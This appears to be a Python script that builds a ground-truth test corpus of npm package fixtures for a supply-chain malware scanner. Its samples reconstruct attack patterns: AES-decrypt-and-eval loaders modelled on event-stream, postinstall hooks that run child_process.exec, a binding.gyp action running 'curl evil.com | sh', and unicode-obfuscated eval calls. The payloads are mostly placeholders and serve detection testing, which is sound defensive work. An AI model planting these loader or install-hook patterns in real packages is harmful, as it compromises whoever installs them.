#!/usr/bin/env python3
"""Generate G5 incident corpus (Tier A-G) and manifest.yaml — run before any scan."""

from __future__ import annotations

import json
import shutil
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
INCIDENTS = ROOT / "benchmarks" / "incidents"
MOCK = ROOT / "fixtures" / "MOCK_"
BYPASS = ROOT / "adversarial" / "bypass"


def _write(pkg: Path, files: dict, expected: dict) -> None:
    pkg.mkdir(parents=True, exist_ok=True)
    for name, content in files.items():
        fp = pkg / name
        fp.parent.mkdir(parents=True, exist_ok=True)
        fp.write_text(content, encoding="utf-8")
    (pkg / "expected.json").write_text(json.dumps(expected, indent=2), encoding="utf-8")


def _link_mock(dest_id: str, mock_name: str, extra: dict | None = None) -> dict:
    src = MOCK / mock_name
    dest = INCIDENTS / dest_id
    if dest.exists():
        shutil.rmtree(dest)
    if src.is_dir():
        shutil.copytree(src, dest)
    exp = json.loads((dest / "expected.json").read_text(encoding="utf-8"))
    if extra:
        exp.update(extra)
    (dest / "expected.json").write_text(json.dumps(exp, indent=2), encoding="utf-8")
    return {"id": dest_id, "tier": "A", "path": f"benchmarks/incidents/{dest_id}", **exp}


def gen_a01() -> dict:
    pkg = INCIDENTS / "INC-A01"
    _write(
        pkg,
        {
            "package.json": json.dumps(
                {
                    "name": "flatmap-stream-recon",
                    "version": "0.1.1",
                    "description": "aes-key-placeholder-32bytes-long!!",
                    "main": "index.js",
                }
            ),
            "index.js": """const crypto = require('crypto');
const data = require('./test/data');
const key = process.env.npm_package_description || '';
const decipher = crypto.createDecipher('aes-256-cbc', key.slice(0, 32));
let dec = decipher.update(data.payload, 'hex', 'utf8');
dec += decipher.final('utf8');
eval(dec);
""",
            "test/data.js": 'module.exports = { payload: "4a5b6c" };\n',
        },
        {
            "verdict": "DETECT",
            "require_cross_file": True,
            "category": "static",
            "source": "flatmap-stream post-mortem",
            "note": "Reconstructed multi-file AES shard pattern",
        },
    )
    return {
        "id": "INC-A01",
        "tier": "A",
        "path": "benchmarks/incidents/INC-A01",
        "verdict": "DETECT",
        "require_cross_file": True,
        "category": "static",
    }


def gen_a02() -> dict:
    pkg = INCIDENTS / "INC-A02"
    _write(
        pkg,
        {
            "package.json": json.dumps(
                {
                    "name": "dep-confusion-stager",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "node install.js"},
                }
            ),
            "install.js": "const s = require('./stager'); s.run();\n",
            "stager.js": """const cp = require('child_process');
const cfg = require('./config');
module.exports = { run: () => cp.exec(cfg.cmd) };
""",
            "config.js": "module.exports = { cmd: process.env.STAGE_CMD || 'echo staged' };\n",
        },
        {
            "verdict": "DETECT",
            "require_cross_file": True,
            "require_lifecycle": True,
            "category": "static",
            "source": "dependency confusion postinstall",
        },
    )
    return {
        "id": "INC-A02",
        "tier": "A",
        "path": "benchmarks/incidents/INC-A02",
        "verdict": "DETECT",
        "require_cross_file": True,
        "category": "static",
    }


def gen_a21() -> dict:
    pkg = INCIDENTS / "INC-A21"
    _write(
        pkg,
        {
            "package.json": json.dumps(
                {
                    "name": "craready-transitive-test",
                    "version": "1.0.0",
                    "dependencies": {"flatmap-stream": "0.1.1"},
                }
            ),
            "index.js": "require('./packages/flatmap-stream');\n",
            "packages/flatmap-stream/package.json": json.dumps({"name": "flatmap-stream", "version": "0.1.1", "main": "index.js"}),
            "packages/flatmap-stream/index.js": """const d = require('./shard');
const cp = require('child_process');
cp.exec(d.cmd);
""",
            "packages/flatmap-stream/shard.js": "module.exports = { cmd: process.env.X || 'curl evil' };\n",
        },
        {
            "verdict": "DETECT",
            "require_cross_file": True,
            "category": "static",
            "source": "transitive dep path",
            "allowed_statuses": ["DETECT", "SUSPICIOUS", "UNKNOWN_RISK"],
        },
    )
    return {
        "id": "INC-A21",
        "tier": "A",
        "path": "benchmarks/incidents/INC-A21",
        "verdict": "DETECT",
        "category": "static",
    }


def gen_tier_b() -> list[dict]:
    cases = []
    # B01 chai-foundry style large obfuscated entry
    _write(
        INCIDENTS / "INC-B01",
        {
            "package.json": json.dumps({"name": "chai-foundry-sample", "version": "7.0.2", "main": "index.js"}),
            "index.js": "require('./lib/loader');\n",
            "lib/loader.js": "x".join(["/*obf*/"]) * 5000
            + "\nconst cp=require('child_process');cp.exec(process.env.CMD||'id');\n",
        },
        {
            "verdict": "DETECT",
            "allowed_statuses": ["DETECT", "SUSPICIOUS", "UNKNOWN_RISK"],
            "category": "obfuscated",
            "source": "OSV MAL-2026-13356 pattern",
        },
    )
    cases.append({"id": "INC-B01", "tier": "B", "path": "benchmarks/incidents/INC-B01", "verdict": "DETECT", "category": "obfuscated"})

    # B02 import-time entry
    _write(
        INCIDENTS / "INC-B02",
        {
            "package.json": json.dumps({"name": "import-time-mal", "version": "1.0.0", "main": "index.js"}),
            "index.js": """const fs = require('fs');
const cp = require('child_process');
const payload = fs.readFileSync('./secret.txt', 'utf8');
cp.exec(payload);
""",
            "secret.txt": "echo import-time\n",
        },
        {
            "verdict": "DETECT",
            "allowed_statuses": ["DETECT", "SUSPICIOUS", "UNKNOWN_RISK"],
            "category": "obfuscated",
        },
    )
    cases.append({"id": "INC-B02", "tier": "B", "path": "benchmarks/incidents/INC-B02", "verdict": "DETECT", "category": "obfuscated"})

    detect_mocks = sorted(
        [
            d.name
            for d in MOCK.iterdir()
            if d.is_dir()
            and (d / "expected.json").is_file()
            and json.loads((d / "expected.json").read_text(encoding="utf-8")).get("verdict") == "DETECT"
        ]
    )
    for i in range(3, 11):
        mock_name = detect_mocks[(i - 3) % len(detect_mocks)] if detect_mocks else "M01_shard_three_modules"
        dest_id = f"INC-B{i:02d}"
        dest = INCIDENTS / dest_id
        if dest.exists():
            shutil.rmtree(dest)
        shutil.copytree(MOCK / mock_name, dest)
        exp = {"verdict": "DETECT", "allowed_statuses": ["DETECT", "SUSPICIOUS", "UNKNOWN_RISK"], "category": "obfuscated"}
        (dest / "expected.json").write_text(json.dumps(exp, indent=2), encoding="utf-8")
        cases.append({"id": dest_id, "tier": "B", "path": f"benchmarks/incidents/{dest_id}", **exp})

    return cases


def gen_tier_c() -> list[dict]:
    cases = []
    # C01 event-stream AES dormant
    _write(
        INCIDENTS / "INC-C01",
        {
            "package.json": json.dumps(
                {"name": "event-stream", "version": "3.3.6", "description": "copay-target-key-32chars-long!!"}
            ),
            "index.js": """const crypto = require('crypto');
const data = require('./test/data');
if (process.env.npm_package_name === '@copay/bitpay') {
  const d = crypto.createDecipher('aes-256-cbc', process.env.npm_package_description);
  eval(d.update(data.payload,'hex','utf8')+d.final('utf8'));
}
""",
            "test/data.js": 'module.exports = { payload: "deadbeef" };\n',
        },
        {"verdict": "DOCUMENTED_MISS", "category": "documented_miss", "source": "event-stream AES dormant"},
    )
    cases.append({"id": "INC-C01", "tier": "C", "path": "benchmarks/incidents/INC-C01", "verdict": "DOCUMENTED_MISS", "category": "documented_miss"})

    # C02 phantom-gyp
    _write(
        INCIDENTS / "INC-C02",
        {
            "package.json": json.dumps({"name": "phantom-gyp-sample", "version": "1.0.0", "gypfile": True}),
            "binding.gyp": '{"targets":[{"target_name":"foo","actions":[{"action_name":"build","inputs":["hack.sh"],"outputs":["out"],"action":["sh","hack.sh"]}]}]}',
            "hack.sh": "curl evil.com | sh\n",
        },
        {"verdict": "DOCUMENTED_MISS", "category": "documented_miss", "source": "phantom-gyp binding.gyp"},
    )
    cases.append({"id": "INC-C02", "tier": "C", "path": "benchmarks/incidents/INC-C02", "verdict": "DOCUMENTED_MISS", "category": "documented_miss"})

    # C03 B14 minified
    dest = INCIDENTS / "INC-C03"
    if dest.exists():
        shutil.rmtree(dest)
    shutil.copytree(BYPASS / "B14_minified_single", dest)
    (dest / "expected.json").write_text(
        json.dumps({"verdict": "DOCUMENTED_SKIP", "category": "documented_miss", "source": "B14 minified"}),
        encoding="utf-8",
    )
    cases.append({"id": "INC-C03", "tier": "C", "path": "benchmarks/incidents/INC-C03", "verdict": "DOCUMENTED_SKIP", "category": "documented_miss"})

    # C04 env-key only trigger
    _write(
        INCIDENTS / "INC-C04",
        {
            "package.json": json.dumps({"name": "env-only-trigger", "version": "1.0.0"}),
            "index.js": """if (process.env.TARGET_WALLET === 'copay') {
  require('child_process').exec('curl evil');
}
""",
        },
        {"verdict": "DOCUMENTED_MISS", "category": "documented_miss"},
    )
    cases.append({"id": "INC-C04", "tier": "C", "path": "benchmarks/incidents/INC-C04", "verdict": "DOCUMENTED_MISS", "category": "documented_miss"})

    # C05 metadata only
    _write(
        INCIDENTS / "INC-C05",
        {
            "package.json": json.dumps(
                {"name": "lodash", "version": "4.17.20", "description": "known vulnerable metadata only"}
            ),
        },
        {"verdict": "DOCUMENTED_SKIP", "category": "documented_miss", "note": "npm audit only CVE"},
    )
    cases.append({"id": "INC-C05", "tier": "C", "path": "benchmarks/incidents/INC-C05", "verdict": "DOCUMENTED_SKIP", "category": "documented_miss"})

    return cases


def gen_tier_d() -> list[dict]:
    cases = []
    benign_templates = [
        ("INC-D01", "lodash-stub", 'module.exports = { map: (a, fn) => a.map(fn) };\n'),
        ("INC-D02", "chalk-stub", 'module.exports = { green: (s) => s };\n'),
        ("INC-D03", "express-stub", 'module.exports = function() { return { get: () => {} }; };\n'),
    ]
    for inc_id, name, body in benign_templates:
        _write(
            INCIDENTS / inc_id,
            {"package.json": json.dumps({"name": name, "version": "1.0.0", "main": "index.js"}), "index.js": body},
            {"verdict": "CLEAN", "category": "static"},
        )
        cases.append({"id": inc_id, "tier": "D", "path": f"benchmarks/incidents/{inc_id}", "verdict": "CLEAN", "category": "static"})

    # D04 M04 copy
    for i, mock in enumerate(["M04_benign_crypto"], start=4):
        dest_id = f"INC-D{i:02d}"
        dest = INCIDENTS / dest_id
        if dest.exists():
            shutil.rmtree(dest)
        shutil.copytree(MOCK / mock, dest)
        exp = {"verdict": "CLEAN", "category": "static"}
        (dest / "expected.json").write_text(json.dumps(exp, indent=2), encoding="utf-8")
        cases.append({"id": dest_id, "tier": "D", "path": f"benchmarks/incidents/{dest_id}", **exp})

    for i in range(5, 11):
        dest_id = f"INC-D{i:02d}"
        _write(
            INCIDENTS / dest_id,
            {
                "package.json": json.dumps({"name": f"benign-pkg-{i}", "version": "1.0.0"}),
                "index.js": f"module.exports = {{ id: {i}, add: (a,b) => a+b }};\n",
            },
            {"verdict": "CLEAN", "category": "static"},
        )
        cases.append({"id": dest_id, "tier": "D", "path": f"benchmarks/incidents/{dest_id}", "verdict": "CLEAN", "category": "static"})

    return cases


def gen_tier_e() -> list[dict]:
    cases = []
    patterns = [
        ("INC-E01", "jest_mock_noise", True),
        ("INC-E02", "vendor_lodash_stub", False),
        ("INC-E03", "workspace_monorepo", True),
        ("INC-E04", "benign_webpack_bundle", False),
        ("INC-E05", "pnpm_lock_noise", False),
        ("INC-E06", "ci_workflow_mix", True),
        ("INC-E07", "test_beside_src", True),
        ("INC-E08", "duplicate_pkg_json", True),
        ("INC-E09", "nested_tests", True),
        ("INC-E10", "readme_only_noise", False),
        ("INC-E11", "types_ts_noise", False),
        ("INC-E12", "config_json_noise", False),
        ("INC-E13", "shard_in_noise", True),
        ("INC-E14", "mock_fp_trap", False),
        ("INC-E15", "multi_workspace_shard", True),
    ]
    for inc_id, pattern, has_shard in patterns:
        pkg = INCIDENTS / inc_id
        files: dict = {
            "package.json": json.dumps({"name": pattern, "version": "1.0.0", "workspaces": ["packages/*"]}),
            "pnpm-lock.yaml": "lockfileVersion: 5\n",
            "README.md": "# benign project\n",
            ".github/workflows/ci.yml": "on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n",
            "__tests__/mock.test.js": "test('mock', () => { expect(1).toBe(1); });\n",
            "src/index.js": "module.exports = { ok: true };\n",
            "packages/a/package.json": json.dumps({"name": "pkg-a", "version": "1.0.0"}),
            "packages/a/index.js": "module.exports = {};\n",
        }
        if has_shard:
            files["src/shard.js"] = "module.exports = { x: process.env.SECRET };\n"
            files["src/run.js"] = """const s = require('./shard');
const cp = require('child_process');
cp.exec(s.x || 'echo');
"""
            files["package.json"] = json.dumps(
                {"name": pattern, "version": "1.0.0", "scripts": {"postinstall": "node src/run.js"}}
            )
            expected = {"verdict": "DETECT", "category": "dynamic_noise", "noise_context": True}
        else:
            files["dist/bundle.min.js"] = "!function(){var e={};module.exports=e}();\n"
            files["node_modules/lodash/index.js"] = "module.exports = { map: Array.prototype.map };\n"
            expected = {"verdict": "CLEAN", "category": "dynamic_noise", "noise_context": True}

        _write(pkg, files, expected)
        cases.append({"id": inc_id, "tier": "E", "path": f"benchmarks/incidents/{inc_id}", **expected})

    return cases


def gen_tier_f() -> list[dict]:
    cases = []
    # F01 RTL near eval
    rtl = "\u202e"
    _write(
        INCIDENTS / "INC-F01",
        {
            "package.json": json.dumps({"name": "rtl-eval", "version": "1.0.0"}),
            "index.js": f"const x = 'safe'{rtl}; eval(x);\n",
        },
        {"verdict": "DETECT", "category": "obfuscated", "unicode_pattern": "rtl_override"},
    )
    cases.append({"id": "INC-F01", "tier": "F", "path": "benchmarks/incidents/INC-F01", "verdict": "DETECT", "category": "obfuscated"})

    # F02 zero-width joiner
    _write(
        INCIDENTS / "INC-F02",
        {
            "package.json": json.dumps({"name": "zwsp-exec", "version": "1.0.0"}),
            "index.js": "const a = 'ev'\u200dal'; const cp = require('child_process'); cp.exec(a);\n",
        },
        {"verdict": "DETECT", "category": "obfuscated", "unicode_pattern": "zero_width"},
    )
    cases.append({"id": "INC-F02", "tier": "F", "path": "benchmarks/incidents/INC-F02", "verdict": "DETECT", "category": "obfuscated"})

    # F03 variation selector
    _write(
        INCIDENTS / "INC-F03",
        {
            "package.json": json.dumps({"name": "glassworm-vs", "version": "1.0.0"}),
            "index.js": "const cmd = 'whoami\uFE0f'; require('child_process').exec(cmd);\n",
        },
        {"verdict": "DETECT", "allowed_statuses": ["DETECT", "SUSPICIOUS"], "category": "obfuscated", "unicode_pattern": "variation_selector"},
    )
    cases.append({"id": "INC-F03", "tier": "F", "path": "benchmarks/incidents/INC-F03", "verdict": "DETECT", "category": "obfuscated"})

    # F04 homoglyph require
    _write(
        INCIDENTS / "INC-F04",
        {
            "package.json": json.dumps({"name": "homoglyph-req", "version": "1.0.0"}),
            "index.js": "const \u0440equire = require; \u0440equire('child_process').exec('id');\n",
        },
        {"verdict": "DETECT", "category": "obfuscated", "unicode_pattern": "homoglyph"},
    )
    cases.append({"id": "INC-F04", "tier": "F", "path": "benchmarks/incidents/INC-F04", "verdict": "DETECT", "category": "obfuscated"})

    # F05-F08 more malicious unicode
    for i, (pat, body) in enumerate(
        [
            ("bidi_ltr", "const x = '\u202a' + 'eval(code)'; eval(x);\n"),
            ("zw_nbsp", "const s = 'ex\u2060ec'; require('child_process').exec(s);\n"),
            ("combining", "const c = 'e\u0301val'; Function(c)();\n"),
            ("tag_chars", "const t = '\uE0001'; eval('1+1'); // " + "tag\n"),
        ],
        start=5,
    ):
        inc_id = f"INC-F{i:02d}"
        _write(
            INCIDENTS / inc_id,
            {"package.json": json.dumps({"name": pat, "version": "1.0.0"}), "index.js": body},
            {"verdict": "DETECT", "allowed_statuses": ["DETECT", "SUSPICIOUS"], "category": "obfuscated", "unicode_pattern": pat},
        )
        cases.append({"id": inc_id, "tier": "F", "path": f"benchmarks/incidents/{inc_id}", "verdict": "DETECT", "category": "obfuscated"})

    # F09-F10 benign unicode
    for i, body in enumerate(
        [
            "// comment with emoji 😀\nmodule.exports = { ok: 1 };\n",
            "\ufeffmodule.exports = { bom: true };\n",
        ],
        start=9,
    ):
        inc_id = f"INC-F{i:02d}"
        _write(
            INCIDENTS / inc_id,
            {"package.json": json.dumps({"name": f"benign-unicode-{i}", "version": "1.0.0"}), "index.js": body},
            {"verdict": "CLEAN", "category": "obfuscated", "unicode_pattern": "benign"},
        )
        cases.append({"id": inc_id, "tier": "F", "path": f"benchmarks/incidents/{inc_id}", "verdict": "CLEAN", "category": "obfuscated"})

    # F11-F12 more malicious
    for i, body in enumerate(
        [
            "const a = 'ev' + '\u200c' + 'al'; eval(a);\n",
            "const r = '\uFF52\uFF45\uFF51\uFF55\uFF49\uFF52\uFF45'; globalThis[r]('alert(1)');\n",
        ],
        start=11,
    ):
        inc_id = f"INC-F{i:02d}"
        _write(
            INCIDENTS / inc_id,
            {"package.json": json.dumps({"name": f"unicode-mal-{i}", "version": "1.0.0"}), "index.js": body},
            {"verdict": "DETECT", "allowed_statuses": ["DETECT", "SUSPICIOUS"], "category": "obfuscated"},
        )
        cases.append({"id": inc_id, "tier": "F", "path": f"benchmarks/incidents/{inc_id}", "verdict": "DETECT", "category": "obfuscated"})

    return cases


def write_manifest(all_cases: list[dict]) -> None:
    manifest = {
        "version": 3,
        "frozen_at": datetime.now(timezone.utc).isoformat(),
        "description": "Google Elite G5-G7 incident corpus — ground truth frozen before scan",
        "tiers": {
            "A": {"min_cases": 20, "recall_min": 0.95, "require_cross_file": True},
            "B": {"min_cases": 10, "suspicious_or_detect_min": 0.80},
            "C": {"min_cases": 5, "silent_clean_forbidden": True},
            "D": {"min_cases": 10, "fpr_max": 0.02},
            "E": {"min_cases": 15, "noise_fp_max": 0.05, "shard_recall_min": 0.90},
            "F": {"min_cases": 12, "recall_min": 0.85, "unicode_fp_max": 0.03},
            "G": {"fpr_max": 0.02, "f3_min": 0.90, "precision_at_20_min": 0.80},
        },
        "cases": all_cases,
    }
    INCIDENTS.mkdir(parents=True, exist_ok=True)
    json_path = INCIDENTS / "manifest.json"
    json_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    # YAML mirror for human readability (no pyyaml required)
    yaml_path = INCIDENTS / "manifest.yaml"
    lines = [
        f"version: {manifest['version']}",
        f"frozen_at: \"{manifest['frozen_at']}\"",
        f"description: \"{manifest['description']}\"",
        f"case_count: {len(all_cases)}",
        "cases:",
    ]
    for c in all_cases:
        lines.append(f"  - id: {c['id']}")
        lines.append(f"    tier: {c['tier']}")
        lines.append(f"    path: {c['path']}")
        lines.append(f"    verdict: {c.get('verdict', 'DETECT')}")
    yaml_path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def main() -> None:
    all_cases: list[dict] = []
    all_cases.append(gen_a01())
    all_cases.append(gen_a02())

    mock_detect = sorted(
        [d.name for d in MOCK.iterdir() if d.is_dir() and json.loads((d / "expected.json").read_text()).get("verdict") == "DETECT"]
    )[:22]
    for i, mock_name in enumerate(mock_detect, start=3):
        inc_id = f"INC-A{i:02d}"
        all_cases.append(_link_mock(inc_id, mock_name, {"category": "static", "source": f"MOCK {mock_name}"}))

    all_cases.append(gen_a21())
    all_cases.extend(gen_tier_b())
    all_cases.extend(gen_tier_c())
    all_cases.extend(gen_tier_d())
    all_cases.extend(gen_tier_e())
    all_cases.extend(gen_tier_f())

    write_manifest(all_cases)
    print(f"Generated {len(all_cases)} incident cases in {INCIDENTS}")


if __name__ == "__main__":
    main()
